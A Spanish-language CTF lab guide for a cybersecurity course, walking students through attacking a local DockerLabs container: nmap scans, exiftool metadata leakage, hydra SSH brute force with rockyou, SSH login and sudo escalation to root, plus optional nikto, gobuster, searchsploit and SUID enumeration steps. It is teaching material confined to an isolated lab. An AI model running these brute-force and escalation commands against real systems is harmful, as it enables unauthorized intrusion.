# Guía de ejecución — Laboratorio 1: BorazuwarahCTF

**Práctica integradora Kali Linux #3 — Diplomado en Ciberseguridad**
Reconocimiento, metadatos, fuerza bruta autorizada, acceso inicial y revisión de privilegios.

> **Alcance y autorización.** Todos los comandos de esta guía se ejecutan **únicamente** contra la
> máquina vulnerable `BorazuwarahCTF` desplegada en un contenedor Docker **local** (IP `172.17.0.2`).
> Es un entorno de laboratorio aislado y autorizado por el docente. No se deben ejecutar estos
> comandos contra sitios web, servidores institucionales ni direcciones públicas (regla ética de la guía).

---

## Cómo usar este documento

1. Ten dos terminales abiertas (una queda ocupada por el despliegue).
2. Ejecuta cada paso en orden; debajo de cada comando tienes **Propósito**, **Qué esperar** y el punto de **📸 Captura**.
3. Cada captura debe mostrar **la terminal completa**: el comando y su salida.
4. Nombra tus capturas con el código `L1-XX` (p. ej. `L1-05`) para mapearlas luego a las "Figura X" del informe.

### Mapa de capturas (resumen)

| Código | Fase | Qué captura |
|--------|------|-------------|
| L1-01 | Despliegue | Descompresión + despliegue con IP `172.17.0.2` asignada |
| L1-02 | Conectividad | `ping`, `ip a`, `docker ps` |
| L1-03 | Enumeración | `nmap -sC -sV --min-rate 5000` (escaneo agresivo) |
| L1-04 | Alternativa sigilosa | `nmap -sS -sV` (comparación) |
| L1-05 | Servicio web | `curl -I` y/o página en el navegador |
| L1-06 | Descarga | `wget` de la imagen publicada |
| L1-07 | Metadatos | `exiftool` mostrando usuario/secretos |
| L1-08 | Fuerza bruta | `hydra` con la credencial encontrada |
| L1-09 | Acceso SSH | Sesión iniciada + `id` |
| L1-10 | Post-explotación | `whoami`, `id`, `hostname`, `pwd`, `ls -la` |
| L1-11 | Privilegios | `sudo -l` |
| L1-12 | Escalada | `sudo su` + `whoami` (root) |

---

## Fase 0 — Preparación del entorno

Trabaja en una carpeta propia dentro de tu Kali (ej. `/home/kali/borazuwarahctf/`). Coloca ahí el
archivo `borazuwarahctf.zip` descargado desde <https://dockerlabs.es/> (máquina *BorazuwarahCTF*, ~115 MB).

```bash
cd ~/borazuwarahctf          # o la ruta donde dejaste el .zip
ls -lh borazuwarahctf.zip    # confirma que el archivo está completo
```

> Requisitos: Kali con `docker` activo, y las herramientas `nmap`, `curl`, `wget`, `exiftool`, `hydra`
> (vienen de serie en Kali). Si falta `docker`: `sudo systemctl start docker`.

---

## Fase 1 — Despliegue de la máquina vulnerable

```bash
unzip borazuwarahctf.zip
ls
#   -> auto_deploy.sh   borazuwarahctf.tar   borazuwarahctf.zip
chmod +x auto_deploy.sh
sudo ./auto_deploy.sh borazuwarahctf.tar
```

- **Propósito:** descomprimir e importar la imagen Docker de la máquina y desplegarla.
- **Qué esperar:** el banner `DOCKERLABS` y el mensaje
  `Máquina desplegada, su dirección IP es ─> 172.17.0.2`, seguido de
  `Presiona Ctrl+C cuando termines con la máquina para eliminarla`.

> ⚠️ **Esa terminal queda ocupada.** NO la cierres ni pulses `Ctrl+C` todavía: eso **elimina** la
> máquina. **Abre una segunda terminal** para continuar con el resto de la práctica. El `Ctrl+C` se
> usa solo al final, cuando termines todo (Fase 8).

**📸 Captura L1-01** — descompresión y despliegue con la IP `172.17.0.2` visible.
*(Evidencia del profesor: fase "Despliegue" → aprendizaje: uso de laboratorios aislados.)*

---

## Fase 2 — Conectividad y descubrimiento del objetivo

*(En la segunda terminal.)*

```bash
ping -c 4 172.17.0.2
ip a
docker ps
```

- **Propósito:** confirmar que el host responde y que el contenedor está activo.
- **Qué esperar:** 4 respuestas del `ping` (0% pérdida), tu interfaz `docker0` en `ip a`, y el
  contenedor listado en `docker ps`.

**📸 Captura L1-02** — evidencia de IP y conectividad.

---

## Fase 3 — Reconocimiento / enumeración de servicios

```bash
nmap -sC -sV --min-rate 5000 172.17.0.2
```

- **Propósito:** reconocimiento de puertos y servicios. `-sC` ejecuta scripts NSE comunes, `-sV`
  identifica versiones y `--min-rate 5000` acelera el envío de paquetes (escaneo agresivo, válido
  porque es un entorno controlado).
- **Qué esperar:** dos puertos abiertos →
  - `22/tcp ssh OpenSSH 9.2p1 Debian`
  - `80/tcp http Apache httpd 2.4.59 ((Debian))`

**📸 Captura L1-03** — salida de puertos y servicios. *(Aprendizaje: superficie de ataque.)*

### Alternativa sigilosa (para comparar en el informe)

```bash
sudo nmap -sS -sV 172.17.0.2
```

- **Propósito:** `-sS` (SYN scan) no completa la conexión TCP, por lo que es más difícil de detectar;
  además aquí **no** se usa `--min-rate`. Requiere privilegios (`sudo`).
- **Para el informe:** compara velocidad, ruido y probabilidad de detección frente al escaneo agresivo (OPSEC y monitoreo).

**📸 Captura L1-04** — comparación con el escaneo agresivo.

---

## Fase 4 — Exploración del servicio web

```bash
curl -I http://172.17.0.2
```

También abre `http://172.17.0.2` en el navegador (Firefox en Kali). Verás una imagen (un "Kinder Sorpresa").
Para averiguar el **nombre real** del archivo publicado, inspecciona el índice:

```bash
curl -s http://172.17.0.2/ | grep -iE 'src=|href=|img'
```

- **Propósito:** ver qué servicio responde y qué pistas entrega (enumeración web). Tras analizar los
  servicios no hay acceso directo, así que el camino es la imagen publicada.
- **Qué esperar:** cabeceras `Server: Apache/2.4.59 (Debian)` y, en el HTML, la referencia a una imagen
  (en la guía aparece como `imagen.jpeg`; confirma el nombre exacto en tu caso).

**📸 Captura L1-05** — respuesta HTTP y/o la página en el navegador.

---

## Fase 5 — Descarga y análisis de metadatos

```bash
wget http://172.17.0.2/imagen.jpeg        # usa el nombre real que viste en la Fase 4
exiftool imagen.jpeg
```

- **Propósito:** `wget` descarga el recurso para analizarlo localmente; `exiftool` extrae los
  **metadatos** (autor, fechas, descripción, comentarios…).
- **Qué esperar:** en los campos `Description` / `Title` aparecen secretos embebidos →
  `User: borazuwarah` y un campo `Password:` (en la guía aparece **vacío**). El usuario queda
  revelado; la contraseña se obtiene en la fase siguiente.

**📸 Captura L1-06** — archivo descargado (salida de `wget`).
**📸 Captura L1-07** — metadatos de `exiftool` con el usuario/secretos. *(Aprendizaje: fuga de información.)*

---

## Fase 6 — Fuerza bruta autorizada (SSH)

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2 -t 64
```

- **Propósito:** prueba de credenciales **autorizada** contra SSH usando el usuario descubierto
  (`-l borazuwarah`), el diccionario `rockyou` (`-P`), el protocolo `ssh://` y 64 tareas en paralelo (`-t 64`).
- **Qué esperar:** `hydra` reporta `login: borazuwarah  password: 123456` (una credencial válida).
- **Enfoque del informe:** esto evidencia el riesgo de **contraseñas débiles**, no es una técnica para
  usar contra sistemas reales.

> **Si `hydra` no lee el `.gz`:** descomprime el diccionario y apunta al `.txt`:
> ```bash
> sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
> hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
> ```
> (`123456` es de las primeras entradas de `rockyou`, así que lo encuentra en segundos.)

**📸 Captura L1-08** — resultado de `hydra` con la credencial encontrada. *(Aprendizaje: contraseñas débiles.)*

---

## Fase 7 — Acceso inicial por SSH

```bash
ssh borazuwarah@172.17.0.2
#   The authenticity of host ... -> escribe: yes
#   password: 123456     (no se muestra al escribir)
```

Una vez dentro, reconocimiento interno:

```bash
whoami
id
hostname
pwd
ls -la
```

- **Propósito:** validar el acceso inicial y situarse en el sistema (identificar usuario, grupos y contexto).
- **Qué esperar:** prompt `borazuwarah@...:~$`, e `id` mostrando `uid=1000(borazuwarah) ... groups=...,27(sudo)`.

**📸 Captura L1-09** — inicio de sesión SSH exitoso + `id`.
**📸 Captura L1-10** — `whoami`, `id`, `hostname`, `pwd`, `ls -la` (reconocimiento interno).

---

## Fase 8 — Revisión de privilegios y escalada controlada

```bash
sudo -l
```

- **Qué esperar:** la política permite ejecutar prácticamente todo; aparece una línea tipo
  `(ALL : ALL) ALL` y `(ALL) NOPASSWD: /bin/bash` → configuración `sudoers` peligrosa.

**📸 Captura L1-11** — permisos `sudo` disponibles. *(Aprendizaje: mala configuración de sudoers.)*

```bash
sudo su
#   [sudo] password for borazuwarah: 123456
whoami
#   -> root
```

**📸 Captura L1-12** — cambio a `root` confirmado con `whoami`. *(Aprendizaje: principio de mínimo privilegio.)*

### Cierre del laboratorio

```bash
exit        # sale de root
exit        # cierra la sesión SSH
```

Vuelve a la **primera** terminal (la del despliegue) y pulsa `Ctrl+C` para **eliminar** la máquina.

---

## Extras — perfil avanzado (opcional)

> **Mismo alcance y autorización:** todo sigue siendo contra `172.17.0.2` (contenedor local).
> Estos pasos **no** son obligatorios para la rúbrica, pero elevan el nivel técnico: van a **Anexos**
> y refuerzan "Ejecución técnica" y "Explicación de comandos". Capturas con código `L1-A#`.

### A. Espacio de trabajo y registro de sesión
```bash
mkdir -p ~/lab3/{nmap,web,loot,logs}
cd ~/lab3
# Graba TODA la sesión (comandos + salidas) con marca de tiempo:
script -q ~/lab3/logs/sesion_$(date +%F_%H%M).log      # terminar con: exit
```
- **Por qué (pro):** `script` deja un registro íntegro y reproducible de la sesión (trazabilidad).

**📸 L1-A1** — estructura de trabajo (`tree ~/lab3` o `ls -R`).

### B. Escaneos guardados en todos los formatos + reporte HTML
```bash
# -oA guarda .nmap (texto), .gnmap (grepable) y .xml (procesable) a la vez:
nmap -sC -sV -oA nmap/borazuwarah_tcp 172.17.0.2
# Barrido COMPLETO de los 65535 puertos (el escaneo normal solo cubre 1000):
nmap -p- --min-rate 5000 -oA nmap/full_tcp 172.17.0.2
# Top 20 UDP (lento; confirma que no haya servicios UDP ocultos):
sudo nmap -sU --top-ports 20 -oA nmap/udp 172.17.0.2
# NSE de vulnerabilidades y enumeración web:
nmap --script vuln -p 22,80 -oA nmap/vuln 172.17.0.2
nmap --script "http-enum,http-headers,http-title" -p 80 -oA web/http_nse 172.17.0.2
# Convierte el XML en un reporte HTML presentable (si falta: sudo apt install xsltproc):
xsltproc nmap/borazuwarah_tcp.xml -o nmap/borazuwarah_tcp.html
```
- **Por qué:** `-oA` = evidencia estructurada; `-p-` descarta puertos ocultos; el HTML es un informe compartible.

**📸 L1-A2** — `-p-` completo. **📸 L1-A3** — `--script vuln`. **📸 L1-A4** — reporte HTML en el navegador.

### C. Enumeración web en profundidad
```bash
whatweb http://172.17.0.2
nikto -h http://172.17.0.2 -o web/nikto.txt
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -o web/gobuster.txt
# alternativa moderna:  ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
- **Por qué:** identifica tecnologías (`whatweb`), fallos comunes (`nikto`) y rutas ocultas (`gobuster`) → superficie de ataque.

**📸 L1-A5** — whatweb/nikto. **📸 L1-A6** — gobuster con hallazgos.

### D. Correlación de versiones con CVE (sin explotar) y metadatos completos
```bash
searchsploit openssh 9.2
searchsploit apache 2.4.59
exiftool -a -u -g1 imagen.jpeg | tee loot/exif_completo.txt
```
- **Por qué:** `searchsploit` (Exploit-DB offline) muestra la metodología versión→CVE; `exiftool -a -u -g1` saca **todos** los metadatos agrupados.

**📸 L1-A7** — searchsploit.

### E. Fuerza bruta documentada
```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt -t 64 -V -f -o loot/hydra_ssh.txt ssh://172.17.0.2
```
- `-V` muestra cada intento · `-f` detiene al primer acierto · `-o` guarda el resultado.

### F. Post-explotación y escalada documentada (ya como root en el contenedor)
```bash
uname -a; cat /etc/os-release
id; cat /etc/passwd
sudo -l
find / -perm -4000 -type f 2>/dev/null      # binarios SUID (vías de escalada)
cat /etc/crontab; ls -la /etc/cron.*          # tareas programadas
ss -tulpn                                      # servicios a la escucha
find / -iname "*flag*" -o -iname "root.txt" 2>/dev/null   # prueba/flag si existe
```
- **Por qué:** enumeración interna que **justifica técnicamente** la escalada (SUID, sudoers, cron) y evidencia el control obtenido.

**📸 L1-A8** — `sudo -l` + SUID. **📸 L1-A9** — prueba/flag.

### G. Integridad de la evidencia
```bash
sha256sum loot/* nmap/* web/* > loot/HASHES.txt && cat loot/HASHES.txt
```
- **Por qué (pro):** el hash SHA-256 garantiza la **integridad** de las evidencias (cadena de custodia) — enlaza con el principio de Integridad del CID.

**📸 L1-A10** — HASHES.txt.

> **En el informe:** lleva estos extras a **Anexos** y referencia los archivos (`nmap/*.html`, `loot/HASHES.txt`).
> En conclusiones, señala que el barrido `-p-`, los NSE `vuln` y la correlación con CVE **avalan** los hallazgos del flujo principal.

## Checklist de capturas del Laboratorio 1

- [ ] L1-01 Despliegue + IP
- [ ] L1-02 Conectividad
- [ ] L1-03 `nmap` agresivo
- [ ] L1-04 `nmap` sigiloso
- [ ] L1-05 Servicio web
- [ ] L1-06 `wget`
- [ ] L1-07 `exiftool`
- [ ] L1-08 `hydra`
- [ ] L1-09 Acceso SSH + `id`
- [ ] L1-10 Post-explotación
- [ ] L1-11 `sudo -l`
- [ ] L1-12 `sudo su` → root

## Preguntas de análisis (resuélvelas en el informe)

1. ¿Qué diferencia hay entre saber que un puerto está abierto y conocer la **versión** exacta del servicio?
2. ¿Por qué los **metadatos** de una imagen pueden ser una fuente de inteligencia para un atacante?
3. ¿Qué controles evitarían que una **contraseña débil** permita acceso por SSH?
4. ¿Qué es el **principio de mínimo privilegio** y cómo se relaciona con `sudo -l` y `sudoers`?
5. Si esto fuera un servidor empresarial real, ¿qué **tres mitigaciones** aplicarías primero y por qué?

## Datos a anotar durante la ejecución (insumo para el informe)

Además de las 12 capturas, apunta estos valores **reales** de tu ejecución. Son los datos que necesito
para redactar el informe sin inventar nada (si no me los pasas, tendría que asumir los de la guía del profesor):

- **Portada:** tu nombre completo, documento, grupo (02) y fecha de entrega.
- **Fase 3 (`nmap`):** puertos y **versiones exactas** que reportó (SSH y Apache).
- **Fase 4 (web):** nombre **real** del archivo de imagen publicado (si no es `imagen.jpeg`).
- **Fase 5 (`exiftool`):** qué campos revelaron el secreto (usuario y estado del campo `Password`).
- **Fase 6 (`hydra`):** la contraseña encontrada (en la guía es `123456`; confirma la tuya).
- **Fase 7 (SSH):** el `hostname` interno de la máquina (lo ves en el prompt y con `hostname`).
- **Fase 8 (`sudo -l`):** copia textual de las líneas de permisos que te mostró.

## Formato por comando (tabla del profesor, para cada paso)

| Paso | Comando ejecutado | Propósito técnico | Resultado observado | Explicación del estudiante (≥5 líneas) |
|------|-------------------|-------------------|---------------------|----------------------------------------|
| … | … | … | … | Interpreta el resultado y relaciónalo con el riesgo |

> Debajo de cada pantallazo escribe el título **"Figura X. Evidencia del comando ejecutado"** y una
> explicación de **mínimo 5 líneas**: qué hace el comando, qué resultado obtuviste, qué significa y por
> qué importa para la seguridad. Oculta datos sensibles que no sean necesarios.
